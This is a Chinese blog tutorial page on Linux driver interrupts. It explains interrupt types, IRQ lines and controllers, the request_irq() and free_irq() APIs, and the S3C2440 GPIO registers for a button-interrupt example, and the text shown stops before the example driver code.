<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Linux驱动进阶(三)——中断与时钟机制 - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Linux驱动进阶(三)——中断与时钟机制" />
<meta property="og:description" content="文章目录 前言中断简述中断的概念中断的宏观分类中断产生的位置分类同步和异步中断中断小结 中断的实现过程中断信号线(IRQ)中断控制器中断处理过程中断的安装与释放 按键中断实例按键设备原理图有寄存器设备和无寄存器设备按键设备相关端口寄存器 按键中断实例程序分析按键驱动程序组成初始化函数s3c2440_buttons_init()中断处理函数isr_button()退出函数s3c2440_buttons_exit() 时钟机制时间度量时间延时 小结 前言 中断和时钟机制是Linux驱动中重要的两项技术。使用这些技术，可以帮助驱动程序更高效地完成任务。在写设备驱动程序的过程中，为了使系统知道硬件在做什么，必须使用中断。如果没有中断，设备几乎什么都不能做。本章将详细讲解中断与时钟机制。
中断简述 本节将对中断相关概念进行简要的分析，并对中断进行分类。根据不同的中断类型，写中断驱动程序的方法也不一样。下面将主要介绍中断的基本概念和常见分类。
中断的概念 中断是计算机中一个十分重要的概念。如果没有中断，那么设备和程序就无法高效利用计算机的CPU资源。
1.什么是中断
这里以著名的数学家华罗庚老师的一篇科学小品文《统筹方法》来做一个比喻——泡壶茶。
当时的情况是：开水没有；水壶要洗，茶壶茶杯要洗；火生了；茶叶也有了。怎么办？最节约时间的方法是洗好水壶，灌上凉水，放在火上；在等待水开的时间里，洗茶壶、洗茶杯、拿茶叶；等水开了，泡茶喝。
在没有中断的情况下，计算机只能处理一个线性的过程，其要么只烧水，要么只洗茶壶，或者烧完水后再来处理洗茶壶这个事件，这显然是非常浪费时间的。不使用中断方式和使用中断方式泡茶喝水的过程如下图。
由于使用中断机制更为高效，所以计算机中引进了中断机制。在烧水的过程中处理洗茶壶、洗茶杯、拿茶叶，这些短时间的事情，其好处就是能使洗茶壶这个事件尽快得到执行，从而最快地完成泡茶喝这个任务。对应地，在计算机执行程序的过程中，由于出现某个特殊情况（或称为&#34;事件&#34;），使得暂时中止正在运行的程序，而转去执行这一特殊事件的处理，处理完毕之后再回到原来程序继续向下执行，这个过程就是中断。
2.中断在Linux中的实现
中断在Linux中仅仅是通过信号来实现的。当硬件需要通知处理器一个事件时，就可以发送一个信号给处理器。例如，当用户按下手机键盘的应答键时，就会向手机处理器发送一个信号。处理器接收到这个信号后，就会调用喇叭和话筒驱动程序，使用户可以进行通话。
通常情况下，一个驱动程序只要申请中断，并添加中断处理函数就可以了。中断的到达和中断处理函数的调用，都是由内核框架完成的。这样就减少了程序员的很多负担，程序员只要保证申请了正确的中断号及编写了正确的中断处理函数就可以了。
说明：大多数手机使用的都是ARM处理器。对于驱动刚刚入门的读者，不知道应该选择什么处理器来学习。目前最为流行的处理器之一是ARM处理器。其广泛的应用于数字音频播放器、数字机顶盒、游戏机、数码相机和打印机等设备中。
中断的宏观分类 在Linux操作系统中，中断的分类是非常复杂的。根据不同的角度，可以将中断分为不同的类型。各种类型之间的关系并非相互独立，往往是相互交叉的。从宏观上可以分为两类，分别是硬中断和软中断。
1.硬中断
硬中断就是由系统硬件产生的中断。系统硬件通常引起外部事件。外部事件具有随机性和突发性，因此硬中断也具有随机性和突发性。例如当用户使用手机时，正常情况下处于待机状态，待机状态下CPU处理时钟和电源管理方面的问题。当手机的GSM模块接收到来电请求时，会通过连接到CPU的中断线向CPU发送一个硬件中断请求。CPU接收到该中断后，会立刻处理预先定义好的中断处理程序。该中断处理程序会调用铃声驱动程序或者电机驱动程序，使手机响起铃声或震动，等待用户接听电话。
硬件中断具有随机性和突发性的原因是手机根本无法预见电话什么时候到来。另外硬中断是可以屏蔽的。目前许多手机具有飞行模式，在飞机上可以自动屏蔽来电。
2.软中断
软中断是执行中断指令时产生的。软中断不用外设施加中断请求信号，因此中断的发生不是随机的而是由程序安排好的。在汇编程序设计中经常会使用软中断指令，比如int n，n必须是中断向量。
处理器接收软中断有两个来源，一是处理器执行到错误的指令代码，如除零错误；二是由软件产生中断，如进程的调度就是使用的软中断方式。
中断产生的位置分类 从中断产生的位置，可以将中断分为外部中断和内部中断。
1.外部中断
外部中断一般是指由计算机外设发出的中断请求，键盘中断、打印机中断、定时器中断等。外部中断是可以通过编程方式给予屏蔽。
2.内部中断
内部中断是指因硬件出错(如突然掉电、奇偶校验等)或运算出错（除数为零，运算溢出、单步中断等）所引起的中断。内部中断是不可屏蔽的中断。通常情况下，大多数内部中断都由Linux内核进行处理，所以驱动程序员往往不需要关系这些问题。
同步和异步中断 从指令执行的角度，中断又可分为同步中断和异步中断
1.同步中断
同步中断是指令执行的过程中由CPU控制的，CPU在执行完一条指令后才发出中断。也就说，在指令执行过程中，即使有中断的到来，只要指令还没执行完，CPU就不会去执行该中断。同步中断一般是因为程序错误所引起的，例如内存管理中的缺页中断，被0除出错等。当CPU决定处理同步中断时，会调用异常处理函数，使系统从错误的状态恢复过来。当错误不可恢复时，就会出现死机和蓝屏等现象。Windows系统以前的版本经常出现蓝屏现象，就是因为无法从异常恢复的原因。
2.异步中断
异步中断是由硬件设备随机产生的，产生中断时并不考虑与处理器的时钟同步问题，该类型的中断是可以随时产生的。例如在网卡驱动程序中，当网卡接收到数据包后，会向CPU发送一个异步中断事件，表示数据到来，CPU并不知道何时将接收事件。异步中断的中断处理函数与内核的执行顺序是异步执行的，两者没有必然的联系，也不会相互影响。
中断小结 以上4节从不同的角度对Linux中的中断进行了分类，但这不是严格的分类。例如，硬中断可以是外部中断也可以是异步中断，同时，软中断可以是内部中断也可以是同步中断，如下图：
中断的实现过程 中断的实现过程是一个比较复杂的过程。其涉及中断信号线、中断控制器等概念。首先介绍中断信号线的概念。
中断信号线(IRQ) 中断信号线是对中断输入线和中断输出线的统称。中断输入线是指接收中断信号的引脚。中断输出线是指发送中断信号线的引脚。每一个能够产生中断的外设都有一条或者多条中断输出线(Interrupt ReQuest，简称IRQ)，用来通知处理器产生中断。相应地，处理器也有一组中断输入线，用来接收连接到它的外部设备发出的中断信号。
如下图，外设1、外设2、外设3都通过自己的中断输出线连接到ARM处理器上的不同中断输入线上。每一条IRQ线都是有编号的，一般从0开始编号，编号也可以叫做中断号。在写设备驱动程序的过程中，中断号往往需要驱动开发人员来指定。这时，可以查看硬件开发板的原理图，找到设备与ARM处理器的连接关系，如连接到0号中断线，那么中断号就是0。
中断控制器 中断控制器位于ARM处理器核心和中断源之间。外部中断源将中断发送到中断控制器。中断控制器根据优先级进行判断，然后通过引脚将中断请求发送给ARM处理器核心。ARM处理器内部中断控制器如下图所示。
当外部设备同时产生中断时，中断优先级产生逻辑会判断哪一个中断将被执行。如上图中的中断屏蔽寄存器，当屏蔽位为1时，表示对应的中断被禁止；当屏蔽位为0时，表示对应的中断可以正常执行。不同的处理器屏蔽位0/1的意义可能有所不同。
中断处理过程 Linux处理中断的整个过程如下图。
外设产生一个中断信号，该中断通过中断线以电信号的方式发送给中断控制器。中断控制器一直检查IRQ线，检查是否有信号产生。如果有一条或者多条IRQ线产生信号，那么中断控制器就先处理中断编号较小的IRQ线，其优先级较高。中断控制器将收到的该中断号存放在I/O端口A中，该端口直接连接到CPU的数据总线上。这样，CPU可以通过数据总线读出端口A中的中断号。当一切准备就绪后，中断控制器才发送一个信号给CPU的INTR引脚，这时CPU在指令周期的适当时刻，就会分析该信号，以决定中断的类型。如果中断是由外部设备引起的，就会发送一个应答信号给中断控制器的端口B。端口B被设置位一个中断挂起值，表示CPU正在执行该中断，此时不允许该中断再一次产生。CPU根据中断号确定相应的中断处理函数。 中断的安装与释放 当设备需要中断功能时，应该安装中断。如果驱动程序员没有通过安装中断的方式通知Linux内核需要使用中断，那么内核只会简单的应答并且忽略该中断。
1.申请中断线
申请中断线可以使内核知道外设应该使用哪一个中断号，哪一个中断处理函数。申请中断线在需要与外部设备交互时发生。Linux内核提供了request_irq()函数申请中断线。在Linux2.6.29中，该函数由&lt;kernel/irq/Mabage.c&gt;实现。
int request_irq(unsigned int irq, irq_handler_t handler, unsigned long irqflags, const char *devname, void *dev_id); irq表示要申请的中断号，中断号由开发板的硬件原理图决定。handler表示要注册的中断处理函数指针。当中断发生时，内核会自动调用该函数来处理中断。irqflags表示关于中断处理的属性。内核通过这个标志可以决定该中断应该如何处理，在中断上半部和下半部机制中，会详细讲解这部分知识。devname表示设备名字，该名字会在/proc/interrupts中显示。interrupts记录了设备和中断号之间的对应关系。dev_id这个指针是为共享中断线而设立的。如果不需要共享中断线，那么只要将该指针设为NULL即可。" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/a39a0e2f093abfbd56062d5ddef53c7d/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-07-13T17:33:31+08:00" />
<meta property="article:modified_time" content="2023-07-13T17:33:31+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Linux驱动进阶(三)——中断与时钟机制</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>文章目录</h4> 
 <ul><li><a href="#_4" rel="nofollow">前言</a></li><li><a href="#_6" rel="nofollow">中断简述</a></li><li><ul><li><a href="#_8" rel="nofollow">中断的概念</a></li><li><a href="#_20" rel="nofollow">中断的宏观分类</a></li><li><a href="#_28" rel="nofollow">中断产生的位置分类</a></li><li><a href="#_34" rel="nofollow">同步和异步中断</a></li><li><a href="#_40" rel="nofollow">中断小结</a></li></ul> 
  </li><li><a href="#_43" rel="nofollow">中断的实现过程</a></li><li><ul><li><a href="#IRQ_45" rel="nofollow">中断信号线(IRQ)</a></li><li><a href="#_49" rel="nofollow">中断控制器</a></li><li><a href="#_53" rel="nofollow">中断处理过程</a></li><li><a href="#_63" rel="nofollow">中断的安装与释放</a></li></ul> 
  </li><li><a href="#_95" rel="nofollow">按键中断实例</a></li><li><ul><li><a href="#_98" rel="nofollow">按键设备原理图</a></li><li><a href="#_103" rel="nofollow">有寄存器设备和无寄存器设备</a></li><li><a href="#_105" rel="nofollow">按键设备相关端口寄存器</a></li></ul> 
  </li><li><a href="#_125" rel="nofollow">按键中断实例程序分析</a></li><li><ul><li><a href="#_127" rel="nofollow">按键驱动程序组成</a></li><li><a href="#s3c2440_buttons_init_133" rel="nofollow">初始化函数s3c2440_buttons_init()</a></li><li><a href="#isr_button_171" rel="nofollow">中断处理函数isr_button()</a></li><li><a href="#s3c2440_buttons_exit_200" rel="nofollow">退出函数s3c2440_buttons_exit()</a></li></ul> 
  </li><li><a href="#_213" rel="nofollow">时钟机制</a></li><li><ul><li><a href="#_215" rel="nofollow">时间度量</a></li><li><a href="#_235" rel="nofollow">时间延时</a></li></ul> 
  </li><li><a href="#_270" rel="nofollow">小结</a></li></ul> 
</div> 
<p></p> 
<hr> 
<h2><a id="_4"></a>前言</h2> 
<p>中断和时钟机制是Linux驱动中重要的两项技术。使用这些技术，可以帮助驱动程序更高效地完成任务。在写设备驱动程序的过程中，为了使系统知道硬件在做什么，必须使用中断。如果没有中断，设备几乎什么都不能做。本章将详细讲解中断与时钟机制。</p> 
<h2><a id="_6"></a>中断简述</h2> 
<p>本节将对中断相关概念进行简要的分析，并对中断进行分类。根据不同的中断类型，写中断驱动程序的方法也不一样。下面将主要介绍中断的基本概念和常见分类。</p> 
<h3><a id="_8"></a>中断的概念</h3> 
<p><code>中断</code>是计算机中一个十分重要的概念。如果没有中断，那么设备和程序就无法高效利用计算机的CPU资源。<br> <code>1.什么是中断</code><br> 这里以著名的数学家华罗庚老师的一篇科学小品文《统筹方法》来做一个比喻——泡壶茶。<br> 当时的情况是：开水没有；水壶要洗，茶壶茶杯要洗；火生了；茶叶也有了。怎么办？最节约时间的方法是洗好水壶，灌上凉水，放在火上；在等待水开的时间里，洗茶壶、洗茶杯、拿茶叶；等水开了，泡茶喝。<br> 在没有中断的情况下，计算机只能处理一个线性的过程，其要么只烧水，要么只洗茶壶，或者烧完水后再来处理洗茶壶这个事件，这显然是非常浪费时间的。不使用中断方式和使用中断方式泡茶喝水的过程如下图。<br> <img src="https://images2.imgbox.com/fb/96/ehJNCAW7_o.png" alt="在这里插入图片描述"><br> 由于使用中断机制更为高效，所以计算机中引进了中断机制。在烧水的过程中处理洗茶壶、洗茶杯、拿茶叶，这些短时间的事情，其好处就是能使洗茶壶这个事件尽快得到执行，从而最快地完成泡茶喝这个任务。对应地，在计算机执行程序的过程中，由于出现某个特殊情况（或称为"事件"），使得暂时中止正在运行的程序，而转去执行这一特殊事件的处理，处理完毕之后再回到原来程序继续向下执行，这个过程就是中断。<br> <code>2.中断在Linux中的实现</code><br> 中断在Linux中仅仅是通过信号来实现的。当硬件需要通知处理器一个事件时，就可以发送一个信号给处理器。例如，当用户按下手机键盘的应答键时，就会向手机处理器发送一个信号。处理器接收到这个信号后，就会调用喇叭和话筒驱动程序，使用户可以进行通话。<br> 通常情况下，一个驱动程序只要申请中断，并添加中断处理函数就可以了。中断的到达和中断处理函数的调用，都是由内核框架完成的。这样就减少了程序员的很多负担，程序员只要保证申请了正确的中断号及编写了正确的中断处理函数就可以了。<br> <code>说明</code>：大多数手机使用的都是ARM处理器。对于驱动刚刚入门的读者，不知道应该选择什么处理器来学习。目前最为流行的处理器之一是ARM处理器。其广泛的应用于数字音频播放器、数字机顶盒、游戏机、数码相机和打印机等设备中。</p> 
<h3><a id="_20"></a>中断的宏观分类</h3> 
<p>在Linux操作系统中，中断的分类是非常复杂的。根据不同的角度，可以将中断分为不同的类型。各种类型之间的关系并非相互独立，往往是相互交叉的。从宏观上可以分为两类，分别是<code>硬中断和软中断</code>。<br> <code>1.硬中断</code><br> 硬中断就是由系统硬件产生的中断。系统硬件通常引起外部事件。外部事件具有随机性和突发性，因此硬中断也具有随机性和突发性。例如当用户使用手机时，正常情况下处于待机状态，待机状态下CPU处理时钟和电源管理方面的问题。当手机的GSM模块接收到来电请求时，会通过连接到CPU的中断线向CPU发送一个硬件中断请求。CPU接收到该中断后，会立刻处理预先定义好的中断处理程序。该中断处理程序会调用铃声驱动程序或者电机驱动程序，使手机响起铃声或震动，等待用户接听电话。<br> 硬件中断具有随机性和突发性的原因是手机根本无法预见电话什么时候到来。另外硬中断是可以屏蔽的。目前许多手机具有飞行模式，在飞机上可以自动屏蔽来电。<br> <code>2.软中断</code><br> 软中断是执行中断指令时产生的。软中断不用外设施加中断请求信号，因此中断的发生不是随机的而是由程序安排好的。在汇编程序设计中经常会使用软中断指令，比如<code>int n</code>，n必须是中断向量。<br> 处理器接收软中断有两个来源，一是处理器执行到错误的指令代码，如除零错误；二是由软件产生中断，如进程的调度就是使用的软中断方式。</p> 
<h3><a id="_28"></a>中断产生的位置分类</h3> 
<p>从中断产生的位置，可以将中断分为外部中断和内部中断。<br> <code>1.外部中断</code><br> 外部中断一般是指由计算机外设发出的中断请求，键盘中断、打印机中断、定时器中断等。外部中断是可以通过编程方式给予屏蔽。<br> <code>2.内部中断</code><br> 内部中断是指因硬件出错(如突然掉电、奇偶校验等)或运算出错（除数为零，运算溢出、单步中断等）所引起的中断。内部中断是不可屏蔽的中断。通常情况下，大多数内部中断都由Linux内核进行处理，所以驱动程序员往往不需要关系这些问题。</p> 
<h3><a id="_34"></a>同步和异步中断</h3> 
<p>从指令执行的角度，中断又可分为同步中断和异步中断<br> <code>1.同步中断</code><br> 同步中断是指令执行的过程中由CPU控制的，CPU在执行完一条指令后才发出中断。也就说，在指令执行过程中，即使有中断的到来，只要指令还没执行完，CPU就不会去执行该中断。同步中断一般是因为程序错误所引起的，例如内存管理中的缺页中断，被0除出错等。当CPU决定处理同步中断时，会调用异常处理函数，使系统从错误的状态恢复过来。当错误不可恢复时，就会出现死机和蓝屏等现象。Windows系统以前的版本经常出现蓝屏现象，就是因为无法从异常恢复的原因。<br> <code>2.异步中断</code><br> 异步中断是由硬件设备随机产生的，产生中断时并不考虑与处理器的时钟同步问题，该类型的中断是可以随时产生的。例如在网卡驱动程序中，当网卡接收到数据包后，会向CPU发送一个异步中断事件，表示数据到来，CPU并不知道何时将接收事件。异步中断的中断处理函数与内核的执行顺序是异步执行的，两者没有必然的联系，也不会相互影响。</p> 
<h3><a id="_40"></a>中断小结</h3> 
<p>以上4节从不同的角度对Linux中的中断进行了分类，但这不是严格的分类。例如，硬中断可以是外部中断也可以是异步中断，同时，软中断可以是内部中断也可以是同步中断，如下图：<br> <img src="https://images2.imgbox.com/fc/1d/WtVTthOx_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="_43"></a>中断的实现过程</h2> 
<p>中断的实现过程是一个比较复杂的过程。其涉及中断信号线、中断控制器等概念。首先介绍中断信号线的概念。</p> 
<h3><a id="IRQ_45"></a>中断信号线(IRQ)</h3> 
<p><code>中断信号线</code>是对中断输入线和中断输出线的统称。中断输入线是指接收中断信号的引脚。中断输出线是指发送中断信号线的引脚。每一个能够产生中断的外设都有一条或者多条中断输出线(<code>Interrupt ReQuest</code>，简称IRQ)，用来通知处理器产生中断。相应地，处理器也有一组中断输入线，用来接收连接到它的外部设备发出的中断信号。<br> 如下图，外设1、外设2、外设3都通过自己的中断输出线连接到ARM处理器上的不同中断输入线上。每一条IRQ线都是有编号的，一般从0开始编号，编号也可以叫做中断号。在写设备驱动程序的过程中，中断号往往需要驱动开发人员来指定。这时，可以查看硬件开发板的原理图，找到设备与ARM处理器的连接关系，如连接到0号中断线，那么中断号就是0。<br> <img src="https://images2.imgbox.com/88/e8/74UTa4bw_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="_49"></a>中断控制器</h3> 
<p><code>中断控制器</code>位于ARM处理器核心和中断源之间。外部中断源将中断发送到中断控制器。中断控制器根据优先级进行判断，然后通过引脚将中断请求发送给ARM处理器核心。ARM处理器内部中断控制器如下图所示。<br> <img src="https://images2.imgbox.com/70/b3/fdiba9BN_o.png" alt="在这里插入图片描述"><br> 当外部设备同时产生中断时，中断优先级产生逻辑会判断哪一个中断将被执行。如上图中的中断屏蔽寄存器，当屏蔽位为1时，表示对应的中断被禁止；当屏蔽位为0时，表示对应的中断可以正常执行。不同的处理器屏蔽位0/1的意义可能有所不同。</p> 
<h3><a id="_53"></a>中断处理过程</h3> 
<p>Linux处理中断的整个过程如下图。<br> <img src="https://images2.imgbox.com/bf/24/BrVKYlXe_o.png" alt="在这里插入图片描述"></p> 
<ul><li>外设产生一个中断信号，该中断通过中断线以电信号的方式发送给中断控制器。</li><li>中断控制器一直检查IRQ线，检查是否有信号产生。如果有一条或者多条IRQ线产生信号，那么中断控制器就先处理中断编号较小的IRQ线，其优先级较高。</li><li>中断控制器将收到的该中断号存放在<code>I/O</code>端口A中，该端口直接连接到CPU的数据总线上。这样，CPU可以通过数据总线读出端口A中的中断号。</li><li>当一切准备就绪后，中断控制器才发送一个信号给CPU的INTR引脚，这时CPU在指令周期的适当时刻，就会分析该信号，以决定中断的类型。</li><li>如果中断是由外部设备引起的，就会发送一个应答信号给中断控制器的端口B。端口B被设置位一个中断挂起值，表示CPU正在执行该中断，此时不允许该中断再一次产生。</li><li>CPU根据中断号确定相应的中断处理函数。</li></ul> 
<h3><a id="_63"></a>中断的安装与释放</h3> 
<p>当设备需要中断功能时，应该安装中断。如果驱动程序员没有通过安装中断的方式通知Linux内核需要使用中断，那么内核只会简单的应答并且忽略该中断。<br> <code>1.申请中断线</code><br> 申请中断线可以使内核知道外设应该使用哪一个中断号，哪一个中断处理函数。申请中断线在需要与外部设备交互时发生。Linux内核提供了<code>request_irq()</code>函数申请中断线。在Linux2.6.29中，该函数由<code>&lt;kernel/irq/Mabage.c&gt;</code>实现。</p> 
<pre><code class="prism language-c"><span class="token keyword">int</span> <span class="token function">request_irq</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> irq<span class="token punctuation">,</span>
<span class="token class-name">irq_handler_t</span> handler<span class="token punctuation">,</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> irqflags<span class="token punctuation">,</span>
<span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>devname<span class="token punctuation">,</span>
<span class="token keyword">void</span> <span class="token operator">*</span>dev_id<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<ul><li><code>irq</code>表示要申请的中断号，中断号由开发板的硬件原理图决定。</li><li><code>handler</code>表示要注册的中断处理函数指针。当中断发生时，内核会自动调用该函数来处理中断。</li><li><code>irqflags</code>表示关于中断处理的属性。内核通过这个标志可以决定该中断应该如何处理，在中断上半部和下半部机制中，会详细讲解这部分知识。</li><li><code>devname</code>表示设备名字，该名字会在<code>/proc/interrupts</code>中显示。<code>interrupts</code>记录了设备和中断号之间的对应关系。</li><li><code>dev_id</code>这个指针是为共享中断线而设立的。如果不需要共享中断线，那么只要将该指针设为NULL即可。<br> <code>request_irq()</code>函数成功返回0，错误时返回<code>-EINVAL</code>或者<code>_NOMEM</code>。在头文件 <code>&lt;include/asm-generic/Errno-base.h&gt;</code>中明确地定义了<code>EINVAL和ENOMEM</code>宏。</li></ul> 
<pre><code class="prism language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ENOMEM</span>    <span class="token expression"><span class="token number">12</span> </span><span class="token comment">/*Out of memory*/</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">EINVAL</span>    <span class="token expression"><span class="token number">22</span> </span><span class="token comment">/*Invalid argument */</span></span>
</code></pre> 
<p><code>ENOMEM</code>宏表示内存不足。嵌入式系统由于内存资源有限，经常发生这样的错误。<code>EINVAL</code>宏表示无效的参数。如果出现这个返回值，那么就应该查看传递<code>request_irq()</code>的参数是否正确。<br> <code>说明：</code>如何知道一个函数的执行过程和返回值，最好的办法是使用前面介绍的<code>Source Insight</code>工具来查看内核源代码。这样可以帮助读者对内容的实现机制有更深入的理解。<br> <code>2.释放中断线</code><br> 当设备不需要中断线时，需要释放中断线。中断信号是非常紧缺的，例如S3C2440处理器有24根外部中断线(<code>EINT</code>)。可能有读者会疑问，24根外部中断线已经很多了，但其实远远不够的。例如，以不共享中断信号线的方式来设计手机键盘。数字键会占去10条中断线，应答和接听会占去两条中断线，其他功能键又会占去若干条中断线。这个例子中仅仅键盘就占去了十几条中断线，剩下十几条给手机的其他外部设备使用，就是说，中断信号线是远远不够的。<br> 所以<code>Linux内核设计者都建议当中断不再使用时，就应该释放该中断信号线</code>。但是，从应用的角度来思考，手机的键盘应该是手机开机时都是有效的，键盘设备的使用必须要借助中断线来实现，所以开机时不能释放中断线。关机时一般只有启动按键有效，关机任务不是通过操作系统来完成的，所以关机时，可以释放中断线。中断的有效期应该在手机的整个运行周期中。<br> 释放中断线的实现函数是<code>free_irq()</code>。</p> 
<pre><code class="prism language-c"><span class="token keyword">void</span> <span class="token function">free_irq</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> irq<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>dev_id<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<ul><li><code>irq</code>表示释放申请的中断号。</li><li><code>dev_id</code>这个指针是为共享中断线而设立的。该参数将“共享中断”一节中讲述。需要注意的是，只有中断线被释放了，该中断才能被其他设备使用。</li></ul> 
<h2><a id="_95"></a>按键中断实例</h2> 
<p>掌握了足够多的关于中断的知识后，下面将介绍一个安装驱动程序。该案件驱动程序当按键按下时，打印按键按下的提示信息。<br> 作为一个驱动程序开发人员，要做的第一件事请，就是要读懂电路图。在实际的项目开发中，硬件设计有时非常复杂。这时驱动开发人员应该多和硬件开发人员沟通，掌握足够多的硬件知识，以避免写出错误的驱动程序。</p> 
<h3><a id="_98"></a>按键设备原理图</h3> 
<p>首先应该仔细看懂按键设备的原理图。作为一名驱动开发人员这是最基本的素质。按键设备在实际项目中是一种非常简单的设备，硬件原理图也非常简单。本实例的原理图可以从<code>mini2440</code>开发板官方网站免费下载（<code>http://www.arm9.net</code>）。按键原理图如下图。<br> <img src="https://images2.imgbox.com/be/2b/pckdaYa4_o.png" alt="在这里插入图片描述"><br> 这里简单介绍一下该电路图的工作原理。K1到K6是6个按键，其一端接地，另一端分别连接到S3C2440处理器的EINT13、EINT14、EINT15、EINT19引脚上。EIN表示外部中断(<code>External Interrupt</code>)的意思。其中EINT8和EINT19分别接了一个上拉电阻R17和R22。<br> <code>说明</code>：上拉电阻就是起上拉作用。上拉就是将一个不确定的值的引脚通过一个电阻连接到高电平上，使该引脚呈现高电平。这个电阻就是上拉电阻，如上图的R17和R22所示。电阻同时起限流作用。下拉电阻同理。芯片的管脚加上拉电阻的作用是提高输出电平，从而提高芯片输入信号的噪声容限增强抗干扰能力。当按键K1、K2断开时EINT8和EINT19都处于高电平状态。当按键K1~K6的按键按下时，对应外部的中断线就接地，处于低电平状态。这是主要读取外部中断线对应的端口寄存器状态，就可以知道是否有按键按下。</p> 
<h3><a id="_103"></a>有寄存器设备和无寄存器设备</h3> 
<p>从设备的角度来看，设备可以分为有寄存器和无寄存器的设备。按键设备就是一种没有寄存器的设备。按键设备内部没有寄存器并不能代表其没有相应的外部寄存器。为了节约成本，外部寄存器常常被集成到了处理器芯片的内部。这样，处理器可以通过内部寄存器控制外部设备的功能。所以目前的处理器已经不再像以前那样纯粹的处理器了，其更像一台简易的计算机。</p> 
<h3><a id="_105"></a>按键设备相关端口寄存器</h3> 
<p>与按键K1相关的寄存器是端口G控制寄存器，如下图所示。综合起来看可知，按键K1连接到EINT8引脚，该引脚对应GPG0端口的第0位。<br> <img src="https://images2.imgbox.com/b6/27/Iv3Rq1mV_o.png" alt="在这里插入图片描述"><br> 端口是具有有限容量的高速存储部件（也叫寄存器），存储容量一般为8、16和32位。其可以用来存储指令，数据和地址。对硬件设备的操作一般是通过软件方法来读取相应寄存器的状态来实现的。下面介绍与按键设备相关的G端口寄存器，这些内容可以参考三星公司的S3C2440芯片用户手册，也叫<code>datasheet</code>。<br> 端口G有三个控制器，分别为GPGCON、GPGDAT、和GPGUP。该端口各寄存器的地址，读写要求等如下表所示。<br> <img src="https://images2.imgbox.com/e2/c4/7opvZGdX_o.png" alt="在这里插入图片描述"><br> <code>1.GPGCON寄存器</code><br> GPGCON是配置寄存器(GPG Configure)。在S3C2440中，大多数引脚都是功能复用的。一个引脚可以配置成输入、输出或者其他功能。这里GPGCON就是用来为下面哪种功能分别是：数据输入、数据输出、中断和保留。GPGCON的每两位可以取值00、01、10、11表示不同的功能。<br> 由上表可以看出，GPGCON总线的地址是0x56000060，其实就是一个4字节的寄存器。<br> <code>2.GPGDAT寄存器</code><br> GPGDAT是数据寄存器。GPGDAT用于记录引脚的状态。寄存器的每一位表示一种状态。当引脚被GPGCON设置为输入时，读取该寄存器可以获得相应位的状态值；当引脚被GPGCON设置为输出时，写此寄存器的相应位可以令此引脚输出高电平或者低电平。当引脚被GPGCO设置为中断时，此引脚会被设置为中断信号源。<br> <code>3.GPGUP寄存器</code><br> GPGUP寄存器是端口上拉寄存器。端口上拉寄存器控制着每一个端口的上拉寄存器的使能或禁止。当对应位为1时，表示相应的引脚没有内部上拉电阻；当为0时，相应的引脚使用上拉电阻。当需要上拉或下拉电阻时，外围电路没有加上拉或下拉电阻，那么就可以使用内部上拉或下拉电阻来代替。如下图所示为上拉电阻和下拉电阻。<br> <img src="https://images2.imgbox.com/1c/8f/cyDrn2dO_o.png" alt="在这里插入图片描述"><br> 一般GPIO引脚挂空时，即没有接芯片时，其电压是不稳定的，而且容易受到噪声信号的影响。如果该引脚接上上拉电阻，那么电平将处于高电平状态；接上下拉电阻，引脚电平被拉低。另外，上拉电阻可以增强I/O端口的驱动能力。由于硬件工程师一般会为电路设计外部上拉或下拉电阻，所以驱动开发人员在编写驱动时，一般禁用内部上拉或下拉电阻。<br> <code>4.各寄存器的设置</code><br> GPGCON、GPGDAT和GPGUP这3个端口寄存器是相互联系的。它们的设置关系如下表。<br> <img src="https://images2.imgbox.com/d3/02/ZOw607as_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/ab/d8/MSdrCPev_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/79/45/iBiEQaGS_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="_125"></a>按键中断实例程序分析</h2> 
<p>现在开始对按键设备程序进行分析。按键驱动程序由初始化函数、退出函数和中断处理函数组成。</p> 
<h3><a id="_127"></a>按键驱动程序组成</h3> 
<p>按键驱动程序初始化函数、退出函数和中断处理函数的关系如下图。<br> <img src="https://images2.imgbox.com/c0/5a/kA6UigwI_o.png" alt="在这里插入图片描述"></p> 
